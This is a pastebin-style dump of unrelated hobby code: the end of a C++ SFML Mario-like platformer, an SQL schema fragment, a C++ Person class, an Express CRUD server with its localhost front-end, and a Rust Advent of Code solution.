	m7.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/win.png"");
	Sprite win(m7);
	win.setPosition(300, 100);

	Texture m8;
	m8.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/urpro.png"");
	Sprite urpro(m8);
	urpro.setPosition(300, 100);

	Texture m9;
	m9.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/sledur.png"");
	Sprite sledur(m9);
	sledur.setPosition(500, 250);

	Texture m10;
	m10.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/naczan.png"");
	Sprite naczan(m10);
	naczan.setPosition(200, 250);

	Texture m11;
	m11.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/butmen.png"");
	Sprite butmen(m11);
	butmen.setPosition(400, 350);

	Texture m12;
	m12.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/ki.png"");
	Sprite ki(m12);
	ki.setPosition(400, 100);

	Texture m13;
	m13.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/nadpause.png"");
	Sprite nadpause(m13);
	nadpause.setPosition(400, 100);

	Texture m14;
	m14.loadFromFile(""C:/Users/Dimaland/Desktop/Mario/ProjectMario/Paint/Menu/nadprod.png"");
	Sprite nadprod(m14);
	nadprod.setPosition(600, 250);

	Clock clock;

	while (window.isOpen())
	{
		float time = clock.getElapsedTime().asMicroseconds();
		clock.restart();
		time = time / 800;

		Event event;
		while (window.pollEvent(event))
		{
			if (event.type == Event::Closed)
				window.close();

			if (event.type == Event::MouseButtonPressed)
				if (event.key.code == Mouse::Left) {
					Vector2i pos = Mouse::getPosition(window);

					if (menu) {
						if (pos.x >= 600 && pos.x <= 774 &&
							pos.y >= 235 && pos.y <= 306)
							window.close();

						if (pos.x >= 200 && pos.x <= 392 &&
							pos.y >= 235 && pos.y <= 302) {
							menu = false;
							game = true;
						}
					}

					else if (game) {
						if (pos.x >= 150 && pos.x <= 273 &&
							pos.y >= 400 && pos.y <= 448) {
							game = false;
							menu = true;
						}

						for (int i = 0; i < 5; i++)
							if (pos.x >= 150 + 150 * i && pos.x <= 230 + 150 * i &&
								pos.y >= 230 && pos.y <= 310 && sm.blv[i]) {
								puskgame = true;
								sm.pusklever[i] = true;
							}
					}

					else if (pob || die || pause) {
						if (pos.x >= 400 && pos.x <= 685 &&
							pos.y >= 350 && pos.y <= 382) {
							pob = false;
							menu = true;
							play = false;
							die = false;
							p.damage = false;
							pause = false;
							enemydam = 0;
							p.blockdam = 0;
							bossdam = 0;

							p.l = 3;
							p.life = true;

							p.sprite.setTextureRect(IntRect(0, 0, 77, 65));

							for (int i = 0; i < 5; i++)
								sm.pusklever[i] = false;

							offsetX = 0;
							offsetY = 0;

							p.rect.left = 77;
							p.rect.top = 172.5;
						}

						if (pos.x >= 200 && pos.x <= 428 &&
							pos.y >= 250 && pos.y <= 291) {
							pob = false;
							puskgame = true;
							die = false;
							p.damage = false;
							pause = false;
							enemydam = 0;
							p.blockdam = 0;
							bossdam = 0;

							if (lv == 5)
								offsetY = 0;
						}

						if (pos.x >= 600 && pos.x <= 872 &&
							pos.y >= 250 && pos.y <= 290 && pause)
							pause = false;

						else if (pos.x >= 500 && pos.x <= 856 &&
							pos.y >= 250 && pos.y <= 293 && lv < 5 && !die) {
							pob = false;
							puskgame = true;
							die = false;
							p.damage = false;
							pause = false;
							enemydam = 0;
							p.blockdam = 0;
							bossdam = 0;

							sm.pusklever[lv - 1] = false;
							sm.pusklever[lv] = true;
						}
					}
				}
		}

		if (pob)
			sm.blv[lv] = true;

		if (sm.blv[1])
			butlev[1].setTextureRect(IntRect(80, 80, 80, 80));
		if (sm.blv[2])
			butlev[2].setTextureRect(IntRect(80 * 2, 80, 80, 80));
		if (sm.blv[3])
			butlev[3].setTextureRect(IntRect(80 * 3, 80, 80, 80));
		if (sm.blv[4])
			butlev[4].setTextureRect(IntRect(0, 80 * 2, 80, 80));

		if (puskgame) {
			puskgame = false;
			game = false;

			if (sm.pusklever[0]) {
				lv = 1;

				offsetX = 0;
				offsetY = 0;

				p.rect.left = 77;
				p.rect.top = 172.5;

				enemy[0].life = true;

				for (int i = 4; i < 7; i++)
					TileMap[9][i] = 'B';
				TileMap[16][7] = 'C';
				for (int i = 15; i < 17; i++)
					TileMap[i][13] = '2';
			}
			if (sm.pusklever[1]) {
				lv = 2;

				p.rect.left = 1098.39;
				p.rect.top = 1250.5;

				offsetX = p.rect.left;
				offsetY = p.rect.top - 365;

				for (int i = 1; i < 4; i++)
					enemy[i].life = true;

				for (int i = 15; i < 17; i++)
					TileMap[i][13] = 'A';
				TileMap[9][14] = 'B';
				for (int i = 17; i < 19; i++)
					TileMap[9][i] = 'B';
				TileMap[9][22] = 'B';
				for (int i = 19; i < 22; i++)
					TileMap[6][i] = 'C';
				TileMap[3][14] = 'B';
				for (int i = 1; i < 3; i++)
					TileMap[i][26] = '3';
			}
			if (sm.pusklever[2]) {
				lv = 3;

				p.rect.left = 2079;
				p.rect.top = 172.5;

				offsetX = p.rect.left + 500;
				offsetY = 0;

				for (int i = 4; i < 9; i++)
					enemy[i].life = true;
				for (int i = 9; i < 16; i++)
					enemy[i].life = true;
				for (int i = 16; i < 26; i++)
					enemy[i].life = true;

				for (int i = 1; i < 3; i++)
					TileMap[i][26] = 'A';
				for (int i = 28; i < 30; i++)
					TileMap[2][i] = 'B';
				for (int i = 31; i < 33; i++)
					TileMap[2][i] = 'B';
				for (int i = 34; i < 36; i++)
					TileMap[2][i] = 'B';
				for (int i = 29; i < 32; i++)
					TileMap[6][i] = 'B';
				for (int i = 33; i < 36; i++)
					TileMap[6][i] = 'B';
				for (int i = 27; i < 29; i++)
					TileMap[11][i] = 'C';
				for (int i = 31; i < 33; i++)
					TileMap[11][i] = 'B';
				for (int i = 34; i < 36; i++)
					TileMap[11][i] = 'C';
				for (int i = 27; i < 31; i++)
					TileMap[14][i] = 'B';
				for (int i = 32; i < 36; i++)
					TileMap[14][i] = 'B';
				for (int i = 15; i < 17; i++)
					TileMap[i][39] = '4';
			}
			if (sm.pusklever[3]) {
				lv = 4;

				p.rect.left = 3080;
				p.rect.top = 1250.5;

				offsetX = p.rect.left;
				offsetY = p.rect.top - 365;

				for (int i = 26; i < 36; i++)
					enemy[i].life = true;
				for (int i = 36; i < 44; i++)
					enemy[i].life = true;
				for (int i = 44; i < 53; i++)
					enemy[i].life = true;
				for (int i = 53; i < 60; i++)
					enemy[i].life = true;

				for (int i = 15; i < 17; i++)
					TileMap[i][39] = 'A';
				TileMap[15][41] = 'C';
				for (int i = 42; i < 46; i++)
					TileMap[11][i] = 'B';
				TileMap[8][47] = 'C';
				TileMap[8][48] = 'B';
				for (int i = 43; i < 46; i++)
					TileMap[4][i] = 'B';
				for (int i = 1; i < 3; i++)
					TileMap[i][52] = '5';
			}
			if (sm.pusklever[4]) {
				lv = 5;

				boss.life = true;
				boss.l = 10;

				p.rect.left = 4112.69;
				p.rect.top = 172.5;

				for (int i = 1; i < 3; i++)
					TileMap[i][52] = 'A';
				for (int i = 0; i < 4; i++) {
					TileMap[4 + 3 * i][53] = 'B';
					TileMap[5 + 3 * i][54] = 'C';
				}
				for (int i = 0; i < 5; i++) {
					TileMap[2 + 3 * i][63] = 'C';
					TileMap[1 + 3 * i][64] = 'B';
				}
			}

			p.l = 3;
			p.life = true;

			play = true;
		}

		if (p.life && !p.damage && play && !pause) {
			if (!_kbhit())
				if (p.dy == 0) {
					if (p.rig)
						p.sprite.setTextureRect(IntRect(0, 0, 77, 65));
					else if (!p.rig)
						p.sprite.setTextureRect(IntRect(77, 0, -77, 65));
				}

			if (Keyboard::isKeyPressed(Keyboard::Left))
				p.dx = -0.3;
			if (Keyboard::isKeyPressed(Keyboard::Right))
				p.dx = 0.3;

			if (Keyboard::isKeyPressed(Keyboard::Up))
				if (p.onGround) {
					p.dy = -0.5;

					if (p.rig)
						p.sprite.setTextureRect(IntRect(0, 81, 45, 65));
					else if (!p.rig)
						p.sprite.setTextureRect(IntRect(45, 81, -45, 65));

					p.onGround = false;
				}
			if (Keyboard::isKeyPressed(Keyboard::Space))
				if (p.onGround && pu.go == 0) {
					frame = 100;

					if (p.rig) {
						pu.go = 1;

						pu.rect.left = p.rect.left + 67;
						pu.rect.top = p.rect.top + 20;
					}
					else {
						pu.go = 2;

						pu.rect.left = p.rect.left - 12;
						pu.rect.top = p.rect.top + 18;
					}
				}

			if (Keyboard::isKeyPressed(Keyboard::Escape))
				pause = true;
		}

		if (pu.go == 0) {
			pu.rect.left = p.rect.left;
			pu.rect.top = p.rect.top;
		}
		else if (pu.go == 1)
			pu.dx = 2;
		else if (pu.go == 2)
			pu.dx = -2;

		if (frame != 0)
			if (p.dy == 0) {
				if (p.rig)
					p.sprite.setTextureRect(IntRect(68, 80, 69, 61));
				else if (!p.rig)
					p.sprite.setTextureRect(IntRect(68 + 69, 80, -69, 61));

				frame--;
			}

		if (!enemy[0].life) {
			TileMap[11][3] = ' ';
			TileMap[12][3] = ' ';
		}
		else if (enemy[0].life) {
			TileMap[11][3] = 'K';
			TileMap[12][3] = 'K';
		}
		if (!enemy[1].life && !enemy[2].life && !enemy[3].life) {
			TileMap[1][25] = ' ';
			TileMap[2][25] = ' ';
		}
		else if (enemy[1].life && enemy[2].life && enemy[3].life) {
			TileMap[1][25] = 'K';
			TileMap[2][25] = 'K';
		}
		if (!enemy[4].life && !enemy[5].life && !enemy[6].life && !enemy[7].life && !enemy[8].life) {
			TileMap[1][36] = ' ';
			TileMap[2][36] = ' ';
		}
		else if (enemy[4].life && enemy[5].life && enemy[6].life && enemy[7].life && enemy[8].life) {
			TileMap[1][36] = 'K';
			TileMap[2][36] = 'K';
		}
		if (!enemy[9].life && !enemy[10].life && !enemy[10].life && !enemy[11].life && !enemy[12].life &&
			!enemy[13].life && !enemy[14].life && !enemy[15].life) {
			TileMap[5][28] = ' ';
			TileMap[6][28] = ' ';
		}
		else if (enemy[9].life && enemy[10].life && enemy[10].life && enemy[11].life && enemy[12].life &&
			enemy[13].life && enemy[14].life && enemy[15].life) {
			TileMap[5][28] = 'K';
			TileMap[6][28] = 'K';
		}
		if (!enemy[16].life && !enemy[17].life && !enemy[18].life && !enemy[19].life && !enemy[20].life &&
			!enemy[21].life && !enemy[22].life && !enemy[23].life && !enemy[24].life && !enemy[25].life) {
			TileMap[15][38] = ' ';
			TileMap[16][38] = ' ';
		}
		else if (enemy[16].life && enemy[17].life && enemy[18].life && enemy[19].life && enemy[20].life &&
			enemy[21].life && enemy[22].life && enemy[23].life && enemy[24].life && enemy[25].life) {
			TileMap[15][38] = 'K';
			TileMap[16][38] = 'K';
		}
		if (!enemy[26].life && !enemy[27].life && !enemy[28].life && !enemy[29].life && !enemy[30].life &&
			!enemy[31].life && !enemy[32].life && !enemy[33].life && !enemy[34].life && !enemy[35].life) {
			TileMap[13][49] = ' ';
			TileMap[13][50] = ' ';
			TileMap[13][51] = ' ';
		}
		else if (enemy[26].life && enemy[27].life && enemy[28].life && enemy[29].life && enemy[30].life &&
			enemy[31].life && enemy[32].life && enemy[33].life && enemy[34].life && enemy[35].life) {
			TileMap[13][49] = 'K';
			TileMap[13][50] = 'K';
			TileMap[13][51] = 'K';
		}
		if (!enemy[36].life && !enemy[37].life && !enemy[38].life && !enemy[39].life && !enemy[40].life &&
			!enemy[41].life && !enemy[42].life && !enemy[43].life) {
			TileMap[9][40] = ' ';
			TileMap[9][41] = ' ';
		}
		else if (enemy[36].life && enemy[37].life && enemy[38].life && enemy[39].life && enemy[40].life &&
			enemy[41].life && enemy[42].life && enemy[43].life) {
			TileMap[9][40] = 'K';
			TileMap[9][41] = 'K';
		}
		if (!enemy[44].life && !enemy[45].life && !enemy[46].life && !enemy[47].life &&
			!enemy[48].life && !enemy[49].life && !enemy[50].life) {
			TileMap[5][49] = ' ';
			TileMap[5][50] = ' ';
			TileMap[5][51] = ' ';
		}
		else if (enemy[44].life && enemy[45].life && enemy[46].life && enemy[47].life &&
			enemy[48].life && enemy[49].life && enemy[50].life) {
			TileMap[5][49] = 'K';
			TileMap[5][50] = 'K';
			TileMap[5][51] = 'K';
		}
		if (!enemy[53].life && !enemy[54].life && !enemy[55].life && !enemy[56].life && !enemy[57].life &&
			!enemy[58].life && !enemy[59].life)
			TileMap[1][51] = ' ';
		else if (enemy[53].life && enemy[54].life && enemy[55].life && enemy[56].life && enemy[57].life &&
			enemy[58].life && enemy[59].life)
			TileMap[1][51] = 'K';

		if (boss.life) {
			if (boss.rect.left < p.rect.left) {
				boss.sprite.setTextureRect(IntRect(0, 0, 102, 51));
				boss.rig = true;
			}
			else if (boss.rect.left > p.rect.left) {
				boss.sprite.setTextureRect(IntRect(102, 0, -102, 51));
				boss.rig = false;
			}

			if (boss.rect.top > p.rect.top && boss.rect.top < p.rect.top + p.rect.height &&
				puBos.go == 0 && lv == 5) {
				if (boss.rig)
					puBos.go = 1;
				else
					puBos.go = 2;
			}

			if (puBos.go == 0) {
				if (boss.rig) {
					puBos.rect.left = boss.rect.left + 153;
					puBos.rect.top = boss.rect.top;
				}
				else if (!boss.rig) {
					puBos.rect.left = boss.rect.left;
					puBos.rect.top = boss.rect.top;
				}
			}
			else if (puBos.go == 1)
				puBos.dx = 1;
			else if (puBos.go == 2)
				puBos.dx = -1;

			if (boss.rect.left < pu.rect.left && boss.rect.left + 153 > pu.rect.left && boss.life &&
				boss.rect.top < pu.rect.top && boss.rect.top + 77 > pu.rect.top && pu.go != 0) {
				boss.l--;

				pu.go = 0;
			}

			if (p.rect.intersects(boss.rect) && !p.damage) {

				p.dy = -0.5;
				p.l--;

				p.damage = true;

				bossdam = 1;
			}

			if (p.rect.left < puBos.rect.left && p.rect.left + 77 > puBos.rect.left && p.life && !p.damage &&
				p.rect.top < puBos.rect.top && p.rect.top + 65 > puBos.rect.top && puBos.go != 0) {
				p.l--;
				p.damage = true;

				bossdam = 1;
			}
		}

		for (int i = 0; i < vr; i++)
			if (enemy[i].life) {
				if (enemy[i].rect.left < pu.rect.left && enemy[i].rect.left + 10 > pu.rect.left &&
					enemy[i].rect.top < pu.rect.top && enemy[i].rect.top + 50 > pu.rect.top && pu.go != 0) {
					enemy[i].life = false;

					pu.go = 0;
				}

				if (p.rect.intersects(enemy[i].rect) && !p.damage) {
					p.l--;

					p.dy = -0.5;
					p.damage = true;

					if (i == 0)
						enemydam = 1;
					else if (i >= 1 && i < 4)
						enemydam = 2;
					else if (i >= 4 && i < 9)
						enemydam = 3;
					else if (i >= 9 && i < 16)
						enemydam = 4;
					else if (i >= 16 && i < 26)
						enemydam = 5;
					else if (i >= 26 && i < 36)
						enemydam = 6;
					else if (i >= 36 && i < 44)
						enemydam = 7;
					else if (i >= 44 && i < 53)
						enemydam = 8;
					else if (i >= 53 && i < 60)
						enemydam = 9;
				}
			}

		if (p.damage) {
			p.damFrame += 0.006;

			switch (int(p.damFrame))
			{
			case 1:
				if (p.rig)
					p.sprite.setTextureRect(IntRect(229, 72, 72, 65));
				else
					p.sprite.setTextureRect(IntRect(301, 72, -72, 65));
				break;
			case 2:
				if (p.rig)
					p.sprite.setTextureRect(IntRect(308, 95, 76, 34));
				else
					p.sprite.setTextureRect(IntRect(384, 95, -76, 34));
				break;
			case 3:
				if (p.rig)
					p.sprite.setTextureRect(IntRect(391, 101, 80, 31));
				else
					p.sprite.setTextureRect(IntRect(471, 101, -80, 31));
				break;
			case 4:
				if (p.l > 0) {
					if (enemydam != 0)
						switch (enemydam)
						{
						case 1:
							p.rect.left = 931.7;
							p.rect.top = 942.5;
							break;
						case 2:
							p.rect.left = 1312.52;
							p.rect.top = 172.5;
							break;
						case 3:
							p.rect.left = 2093.68;
							p.rect.top = 172.5;
							break;
						case 4:
							p.rect.left = 2933.7;
							p.rect.top = 480.5;
							break;
						case 5:
							p.rect.left = 2775.62;
							p.rect.top = 1173.5;
							break;
						case 6:
							p.rect.left = 3176.79;
							p.rect.top = 1173.5;
							break;
						case 7:
							p.rect.left = 3615.72;
							p.rect.top = 865.5;
							break;
						case 8:
							p.rect.left = 3330.41;
							p.rect.top = 557.5;
							break;
						case 9:
							p.rect.left = 3309.64;
							p.rect.top = 95.5;
							break;
						}
					else if (p.blockdam != 0)
						switch (p.blockdam)
						{
						case 1:
							p.rect.left = 931.7;
							p.rect.top = 942.5;
							break;
						case 2:
							p.rect.left = 584.22;
							p.rect.top = 711.5;
							break;
						case 3:
							p.rect.left = 1362.86;
							p.rect.top = 711.5;
							break;
						case 4:
							p.rect.left = 2173.41;
							p.rect.top = 865.5;
							break;
						case 5:
							p.rect.left = 3626.1;
							p.rect.top = 865.5;
							break;
						case 6:
							p.rect.left = 3311.82;
							p.rect.top = 557.5;
							break;
						case 7:
							p.rect.left = 4081;
							p.rect.top = 172.5;
							offsetY = 0;
							break;
						}
					else if (bossdam == 1) {
						p.rect.left = 4081;
						p.rect.top = 172.5;
						offsetY = 0;
					}

					if (p.rig)
						p.sprite.setTextureRect(IntRect(0, 0, 77, 65));
					else if (!p.rig)
						p.sprite.setTextureRect(IntRect(77, 0, -77, 65));

					enemydam = 0;
					p.blockdam = 0;
					bossdam = 0;

					p.damage = false;
					p.damFrame = 0;
				}
				break;
			}
		}

		score.setTextureRect(IntRect(27 * (lv - 1), 0, 27, 36));

		if (p.rect.left > 500 && p.rect.left < 4582)
			offsetX = p.rect.left - 500;
		if (p.rect.top > 250 && p.rect.top < 1135)
			offsetY = p.rect.top - 250;

		p.update(time);
		pu.update(time);
		for (int i = 0; i < vr; i++)
			enemy[i].update(time);
		boss.update(time);
		puBos.update(time);
		window.clear(Color::White);

		fon.setPosition(-offsetX, -offsetY);
		window.draw(fon);

		for (int i = 0; i < H; i++)
			for (int j = 0; j < W; j++) {
				if (TileMap[i][j] == 'A')
					plat.setTextureRect(IntRect(0, 0, ts, ts));
				if (TileMap[i][j] == 'B')
					plat.setTextureRect(IntRect(ts, 0, ts, ts));
				if (TileMap[i][j] == 'C')
					plat.setTextureRect(IntRect(ts * 2, 0, ts, ts));
				if (TileMap[i][j] == 'X')
					plat.setTextureRect(IntRect(ts * 3, 0, ts, ts));
				if (TileMap[i][j] == 'F')
					plat.setTextureRect(IntRect(ts * 4, 0, ts, ts));
				if (TileMap[i][j] == '2')
					plat.setTextureRect(IntRect(0, ts, ts, ts));
				if (TileMap[i][j] == '3')
					plat.setTextureRect(IntRect(ts, ts, ts, ts));
				if (TileMap[i][j] == '4')
					plat.setTextureRect(IntRect(ts * 2, ts, ts, ts));
				if (TileMap[i][j] == '5')
					plat.setTextureRect(IntRect(ts * 3, ts, ts, ts));
				if (TileMap[i][j] == 'K')
					plat.setTextureRect(IntRect(ts * 4, 0, ts, ts));
				if (TileMap[i][j] == ' ')
					continue;

				plat.setPosition(j * ts - offsetX, i * ts - offsetY);
				window.draw(plat);
			}

		window.draw(p.sprite);
		if (pu.go != 0)
			window.draw(pu.sprite);
		for (int i = 0; i < vr; i++)
			window.draw(enemy[i].sprite);
		window.draw(boss.sprite);
		if (puBos.go != 0)
			window.draw(puBos.sprite);

		if (play || pob || die || pause) {
			for (int i = 0; i < p.l; i++)
				window.draw(life[i]);
			for (int i = 0; i < boss.l; i++)
				if (lv == 5)
					window.draw(lifeBoss[i]);
			window.draw(nadlev);
			window.draw(score);

			if (pob || die || pause) {
				if (pob && !die && !pause) {
					if (lv < 5)
						window.draw(urpro);
					else
						window.draw(win);
				}
				else if (!pob && die && !pause)
					window.draw(ki);
				else if (!pob && !die && pause)
					window.draw(nadpause);

				if (lv < 5 && !die && !pause)
					window.draw(sledur);
				else if (pause)
					window.draw(nadprod);

				window.draw(naczan);
				window.draw(butmen);
			}
		}

		if (menu) {
			window.draw(naz);
			window.draw(butplay);
			window.draw(exit);
		}

		if (game) {
			window.draw(nazurav);
			for (int i = 0; i < 5; i++)
				window.draw(butlev[i]);
			window.draw(back);
		}

		window.display();
	}

	return 0;
}"
jUgZf31G,Untitled,ShihabZzz,C++,Sunday 3rd of December 2023 07:38:09 AM CDT,"CREATE TABLE customers (
  customer_id INT NOT NULL AUTO_INCREMENT,
  first_name VARCHAR(255) NOT NULL,
  last_name VARCHAR(255) NOT NULL,
  phone_number VARCHAR(255) NOT NULL,
  street_address VARCHAR(255) NOT NULL,
  customer_star_rating DECIMAL(10,2),
  PRIMARY KEY (customer_id)
);

CREATE TABLE suppliers (
  supplier_id INT NOT NULL AUTO_INCREMENT,
  supplier_company_name VARCHAR(255) NOT NULL,
  supplier_star_rating DECIMAL(10,2),
  phone_number VARCHAR(255) NOT NULL,
  street_address VARCHAR(255) NOT NULL,
  PRIMARY KEY (supplier_id)
);

CREATE TABLE products (
  product_id INT NOT NULL AUTO_INCREMENT,
  product_name VARCHAR(255) NOT NULL,
  price
);"
83ysZg0D,Untitled,Derga,C++,Sunday 3rd of December 2023 07:30:40 AM CDT,"
#include <string>

using namespace std;

struct Address {
    string city_ = """";
    string street_ = """";
    size_t house_number_ = 0;
    size_t building_ = 0;
    size_t entrance_ = 0;
    string doorphone_ = """";
    size_t flat_ = 0;
};

class Date {
private:
    size_t year_;
    size_t month_;
    size_t day_;

public:
    Date(size_t year, size_t month, size_t day) : year_(year), month_(month), day_(day) {};
    Date(size_t month, size_t day) : Date(0, month, day) {};
    Date(size_t day) : Date(0, 0, day) {}
    Date() : Date(0, 0, 0) {}
    Date(const Date& date) : Date(date.year_, date.month_, date.day_) {}
    ~Date() {}

    Date operator=(const Date& date) {
        return Date(date.year_, date.month_, date.day_);
    }

    size_t GetYear() const { 
        return year_; 
    }
    size_t GetMonth() const { 
        return month_;
    }
    size_t GetDay() const { 
        return day_;
    }
    void SetYear(size_t year) { 
        year_ = year; 
    }
    void SetMonth(size_t month) { 
        month_ = month; 
    }
    void SetDay(size_t day) { 
        day_ = day; 
    }
};

bool operator<(const Date& lhs, const Date& rhs) {
    if (lhs.GetYear() != rhs.GetYear()) {
        return lhs.GetYear() < rhs.GetYear();
    }
    if (lhs.GetMonth() != rhs.GetMonth()) {
        return lhs.GetMonth() < rhs.GetMonth();
    }
    return lhs.GetDay() < rhs.GetDay();
}

class Person {
private:
	string surname_ = """";
    string name_  = """";
    string patronymic_ = """";
    bool is_male_ = false;
    size_t age_ = 0;

    Date date_of_birth_;
    
    Address residence_;
    Address registration_;

public:
    Person(const string& surname, const string& name, const string& patronymic,
        bool is_male, size_t age, const Date& date, const Address& residence, const Address& registration)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
        , is_male_(is_male)
        , age_(age)
        , date_of_birth_(date)
        , residence_(residence)
        , registration_(registration)
    {}

    Person(const string& surname, const string& name, const string& patronymic, 
        bool is_male, size_t age, const Date& date, const Address& residence)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
        , is_male_(is_male)
        , age_(age)
        , date_of_birth_(date)
        , residence_(residence)
    {}

    Person(const string& surname, const string& name, const string& patronymic, 
        bool is_male, size_t age, const Date& date)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
        , is_male_(is_male)
        , age_(age)
        , date_of_birth_(date)
    {}

    Person(const string& surname, const string& name, const string& patronymic, 
        bool is_male, size_t age)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
        , is_male_(is_male) 
        , age_(age)
    {}

    Person(const string& surname, const string& name, const string& patronymic,
        bool is_male)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
        , is_male_(is_male)
    {}
    
    Person(const string& surname, const string& name, const string& patronymic)
        : surname_(surname)
        , name_(name)
        , patronymic_(patronymic)
    {}

    Person(const string& surname, const string& name)
        : surname_(surname)
        , name_(name)
    {}

    Person(const string& name)
        : name_(name)
    {}

    Person() {}

    Person(const Person& person) 
        : Person(person.surname_, person.name_, person.patronymic_, person.is_male_, 
            person.age_, person.date_of_birth_, 
            person.residence_, person.registration_) 
    {}
    
    ~Person() {}

    Person operator = (const Person & person){
        return Person(person);
    }

    void SetSurname(const string& surname) { 
        surname_ = surname; 
    }
    void SetName(const string& name) { 
        name_ = name; 
    }
    void SetPatronymic(const string& patrnomic) { 
        patronymic_ = patrnomic; 
    }
    void SetIsMale(bool is_male) { 
        is_male_ = is_male; 
    }
    void SetAge(size_t age) { 
        age_ = age; 
    }
    void SetDateOfBirth(const Date& date) { 
        date_of_birth_ = date; 
    }
    void SetResidenceAddress(const Address& address) { 
        residence_ = address; 
    }
    void SetRegistrationAddress(const Address& address) { 
        registration_ = address; 
    }
    
    string GetSurname() { 
        return surname_; 
    }
    string GetName() { 
        return name_; 
    }
    string GetPatronymic() { 
        return patronymic_; 
    }
    bool GetIsMale() { 
        return is_male_; 
    }
    size_t GetAge() { 
        return age_; 
    }
    Date GetDateOfBirth() { 
        return date_of_birth_; 
    }
    Address GetResidenceAddress() { 
        return residence_; 
    }
    Address GetRegistrationAddress() { 
        return registration_; 
    }
};
"
kiYKMfWH,app.js,Grossos,JavaScript,Sunday 3rd of December 2023 07:24:58 AM CDT,"const express = require('express');
const { db } = require('./config/db-config');
const { dbService } = require('./config/db-config');
const dotenv = require('dotenv');
const app = express();
const cookie = require('cookie-parser');
const cors = require('cors');
// const { name } = require('ejs');
const PORT = process.env.PORT || 5000;
app.use('/js', express.static(__dirname + '/public/js'));
app.use('/css', express.static(__dirname + '/public/css'));
app.use(cookie());
app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());
app.use('/', require('./controllers/pages'));
app.use('/api', require('./controllers/auth'));
app.use(require('./controllers/servers'));
app.set('view engine', 'ejs');
app.set('views', './views');
db.connect((err) => {
    if (err) throw err;
    console.log('Database connected');
});
app.listen(process.env.PORT, () => console.log(`Listening on port ${PORT}`));

// create  
app.post('/insert', (request, response) => {
    console.log(request.body);
    const { name } = request.body;
    const dbS = dbService.getDbServiceInstance();

    const result = dbS.insertNewName(name);

    result
        .then(data => response.json({ data: data }))
        .catch(err => console.log(err));

});

// Create Read Function 
app.get('/getAll', (request, response) => {
    console.log('Get');

    const dbS = dbService.getDbServiceInstance();
    const result = dbS.getAllData();

    result
        .then(data => response.json({ data: data }))
        .catch(err => console.log(err));

    //   response.json({ success: true  });      
});

// update
app.patch('/update', (request, response) => { // :id ????
    // console.log(request.body);
    // console.log(request.headers);
    // console.log(`METHOD:${request.method}`);
    // console.log(`ID:${request.body.id}`);
    // console.log(`NAME:${request.body.name}`);
    const { id, name } = request.body;
    const dbS = dbService.getDbServiceInstance();

    const result = dbS.updateNameById(id, name);

    result
        .then(data => response.json({ success: data }))
        .catch(err => console.log(err));
});

// delete

app.delete('/delete/:id', (request, response) => {
    const { id } = request.params;
    const dbS = dbService.getDbServiceInstance();

    const result = dbS.deleteRowById(id);

    result
        .then(data => response.json({ success: data }))
        .catch(err => console.log(err));

    console.log(request.params);
});

"
LbpRSXJS,day 03,Ihmemies,Rust,Sunday 3rd of December 2023 07:21:49 AM CDT,"lazy_static! {
    static ref RE_ID: regex::Regex = Regex::new(r""\d{1,3}"").unwrap();
    static ref RE_SYMBOL: regex::Regex = Regex::new(r""[*]"").unwrap();
}

// find gears and check if they have neighbouring numbers
fn process(data: &[String]) {    
    let mut sum:i64 = 0;
    for (y, row) in data.iter().enumerate() {
        let gear_iters = RE_SYMBOL.find_iter(row);   
        for gear in gear_iters {
            sum += check_neighbours(data, &y, &gear.start());            
        }
    }  
    println!(""{}"", sum); // 84900879
}

/**
 *   0  1  2  3  4  5  6  7
 *   8  9 10  * 12 13 14 15 
 *  16 17 18 19 20 21 22 23
 */
fn check_neighbours(data: &[String], row: &usize, col: &usize) -> i64 {
    let mut neighbours: String = String::new();    
    let start = col.saturating_sub(3);
    let end = start + 7;

    // iterate through rows -1, 0, 1
    for i in 0..3 {
        neighbours += &data[row + i -1][start..end];
        neighbours.push('|');
    }    

    // check if any numbers are next to the gear in the flattened view
    let num_iters = RE_ID.find_iter(&neighbours);
    let mut n1: i64 = 0;
    let mut n2: i64 = 0;

    for num in RE_ID.find_iter(&neighbours) {        
        let start = num.start();
        let end = num.end();

        if (start..end).any(|index| [2,3,4,10,12,18,19,20].contains(&index)) {
            let num_value = num.as_str().parse::<i64>().unwrap_or(-1);
            if n1 == 0 {
                n1 = num_value;
            } else if n2 == 0 {
                n2 = num_value;               
            } 
        }
    }

    return n1*n2;
}

fn main() {
    let start = Instant::now();
    let data: Result<Vec<String>, io::Error> = read_file(""input/03puzzle.txt"");

    if let Ok(lines) = data {
        process(&lines);
    }
    let duration = start.elapsed();
    println!(""Time elapsed in main() is: {:?}"", duration);
}

fn read_file(file_name: &str) -> io::Result<Vec<String>> {
    let file = File::open(file_name)?;
    let reader = BufReader::new(file);
    let mut data: Vec<String> = vec![];

    for line in reader.lines() {
        let line = line?;
        data.push(line);
    }

    Ok(data)
}

"
ssLTYhtu,dasdsa,Grossos,JavaScript,Sunday 3rd of December 2023 07:15:16 AM CDT,"

document.addEventListener('DOMContentLoaded', () => {
    fetch('http://127.0.0.1:5000/getAll') // , headers
        .then(response => response.json())
        .then(data => loadHTMLTable(data['data']));

});

document.querySelector('table tbody').addEventListener('click', (event) => {
    // console.log(event.target);
    if (event.target.className === 'delete-row-btn') {
        deleteRowById(event.target.dataset.id);
    }
    if (event.target.className === 'edit-row-btn') {
        handleEditRow(event.target.dataset.id);
    }
});

const updateBtn = document.querySelector('#update-row-btn');

function deleteRowById(id) {
    fetch('http://127.0.0.1:5000/delete/' + id, {
        method: 'DELETE'
    })
        .then(response => response.json())
        .then(data => {
            if (data.success)
                location.reload();
        });
}

function handleEditRow(id) {
    const updateSection = document.querySelector('#update-row');
    updateSection.hidden = false;
